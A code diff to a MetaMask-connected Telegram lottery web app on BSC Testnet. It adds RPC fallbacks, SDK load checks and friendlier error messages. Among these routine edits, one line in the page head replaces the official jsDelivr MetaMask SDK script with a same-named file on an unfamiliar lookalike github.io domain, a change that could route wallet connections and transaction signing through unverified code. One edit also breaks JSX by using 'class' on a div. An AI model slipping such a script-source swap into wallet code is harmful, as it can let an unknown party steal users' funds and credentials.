@@ -7,7 +7,7 @@
     <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.production.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@metamask/sdk@0.28.2/dist/index.js"></script>
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.23.2/babel.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -44,6 +44,11 @@
         const CASHBACK_CONTRACT_ADDRESS = '0x8F597A098AA0943e8710c283358D9aA0e465C53D';
         const TOKEN_DISTRIBUTION_CONTRACT_ADDRESS = '0xb11aeE0628cdC3058502faF91fa8FC02686Cf2cc';
         const CHAIN_ID = 97;
+        const BSC_TESTNET_RPCS = [
+            'https://bsc-testnet-rpc.publicnode.com',
+            'https://data-seed-prebsc-1-s1.bnbchain.org:8545',
+            'https://bsc-testnet.bnbchain.org'
+        ];
 
         const LOTTERY_CONTRACT_ABI = [
             {
@@ -210,19 +215,31 @@
             const [debugLogs, setDebugLogs] = useState([]);
             const [showDebugConsole, setShowDebugConsole] = useState(false);
 
-            // Custom logging function to capture logs in UI
+            // Custom logging function
             const logToConsole = (message, type = 'info') => {
                 const timestamp = new Date().toLocaleTimeString();
                 setDebugLogs(prev => [...prev, { timestamp, message, type }]);
                 console.log(`[${timestamp}] ${type.toUpperCase()}: ${message}`);
             };
 
-            // Initialize MetaMask SDK
+            // Check if MetaMask SDK script loaded
+            useEffect(() => {
+                if (typeof MetaMaskSDK === 'undefined') {
+                    logToConsole('MetaMask SDK script failed to load', 'error');
+                } else {
+                    logToConsole('MetaMask SDK script loaded', 'success');
+                }
+            }, []);
+
+            // Initialize MetaMask SDK with fallback
             useEffect(() => {
                 const initializeSdk = async () => {
                     try {
                         logToConsole('Initializing MetaMask SDK...');
-                        const MMSDK = new MetaMaskSDK.MetaMaskSDK({
+                        if (typeof MetaMaskSDK === 'undefined') {
+                            throw new Error('MetaMask SDK not available. Falling back to window.ethereum.');
+                        }
+                        const MMSDK = new MetaMaskSDK({
                             dappMetadata: {
                                 name: 'Luckie Lottery',
                                 url: window.location.href,
@@ -237,7 +254,12 @@
                         setSdk(MMSDK);
                     } catch (err) {
                         logToConsole(`MetaMask SDK initialization failed: ${err.message}`, 'error');
-                        setError('Failed to initialize MetaMask SDK. Please try again.');
+                        if (window.ethereum) {
+                            logToConsole('Falling back to window.ethereum', 'warn');
+                            setSdk({ getProvider: () => window.ethereum, connect: async () => window.ethereum.request({ method: 'eth_requestAccounts' }) });
+                        } else {
+                            setError('MetaMask is not installed. Please install it from https://metamask.io.');
+                        }
                     }
                 };
                 initializeSdk();
@@ -265,10 +287,31 @@
                 const fetchLotteryInfo = async () => {
                     try {
                         logToConsole('Fetching lottery info...');
-                        const provider = new ethers.JsonRpcProvider('https://bsc-testnet-rpc.publicnode.com');
-                        const lotteryContract = new ethers.Contract(LOTTERY_CONTRACT_ADDRESS, LOTTERY_CONTRACT_ABI, provider);
-                        const contractMethods = Object.keys(lotteryContract.functions);
-                        logToConsole(`Lottery contract methods: ${contractMethods.join(', ')}`);
+                        let provider;
+                        for (const rpc of BSC_TESTNET_RPCS) {
+                            try {
+                                provider = new ethers.JsonRpcProvider(rpc);
+                                const network = await provider.getNetwork();
+                                logToConsole(`Connected to RPC ${rpc}, chain ID: ${network.chainId}`);
+                                break;
+                            } catch (rpcErr) {
+                                logToConsole(`Failed to connect to RPC ${rpc}: ${rpcErr.message}`, 'warn');
+                            }
+                        }
+                        if (!provider) {
+                            throw new Error('All BSC Testnet RPCs failed. Please check your network.');
+                        }
+
+                        let lotteryContract;
+                        try {
+                            lotteryContract = new ethers.Contract(LOTTERY_CONTRACT_ADDRESS, LOTTERY_CONTRACT_ABI, provider);
+                            const contractMethods = Object.keys(lotteryContract.interface.functions);
+                            logToConsole(`Lottery contract methods: ${contractMethods.join(', ')}`);
+                        } catch (contractErr) {
+                            logToConsole(`Failed to initialize lottery contract: ${contractErr.message}`, 'error');
+                            throw new Error('Invalid contract address or ABI. Please verify on BSC Testnet Explorer.');
+                        }
+
                         const userIdInt = params.get('userId') ? parseInt(params.get('userId')) : 0;
                         let linkedWallet = '0x0000000000000000000000000000000000000000';
                         if (typeof lotteryContract.telegramIdToWallet === 'function') {
@@ -321,19 +364,18 @@
                 });
             };
 
-            // Connect wallet with MetaMask SDK
+            // Connect wallet with MetaMask SDK or window.ethereum
             const connectWallet = async () => {
                 if (!sdk) {
                     logToConsole('MetaMask SDK not initialized', 'error');
-                    setError('MetaMask SDK not initialized. Please try again.');
+                    setError('MetaMask not available. Please install MetaMask from https://metamask.io.');
                     return null;
                 }
                 try {
                     setError('');
                     setStatus('Connecting to MetaMask...');
-                    logToConsole('Attempting to connect wallet via MetaMask SDK');
+                    logToConsole('Attempting to connect wallet');
 
-                    // Check if provider is available
                     const providerAvailable = sdk.getProvider();
                     if (!providerAvailable) {
                         logToConsole('MetaMask provider not detected', 'error');
@@ -394,7 +436,7 @@
                     if (err.code === 4001) {
                         errorMessage = 'Connection rejected by user';
                     } else if (err.message.includes('No accounts')) {
-                        errorMessage = 'No accounts available in MetaMask';
+                        errorMessage = 'No accounts available in MetaMask. Please add an account.';
                     } else if (err.message.includes('MetaMask provider not detected')) {
                         errorMessage = 'MetaMask is not installed. Please install it from https://metamask.io.';
                     } else if (err.message.includes('Failed to switch')) {
@@ -527,7 +569,7 @@
                                 logToConsole('No tokens available for distribution', 'error');
                                 throw new Error('No tokens available for distribution.');
                             }
-                            tx = await tokenDistributionContract.distributeTokens({ gasLimit: 200000 });
+                            tx = await tokenDistributionContract.distributeTokens({ gasLimit: "200000" });
                             logToConsole(`distributeTokens transaction sent: ${tx.hash}`);
                             break;
                         }
@@ -667,7 +709,7 @@
 
             return (
                 <div className="min-h-screen flex items-center justify-center p-4">
-                    <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full animate-fade-in">
+                    <div class="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full animate-fade-in">
                         <h1 className="text-3xl font-bold text-center mb-4 text-purple-600">Luckie Lottery 🎰</h1>
                         {telegramUser && (
                             <p className="text-sm text-gray-600 mb-4 text-center">
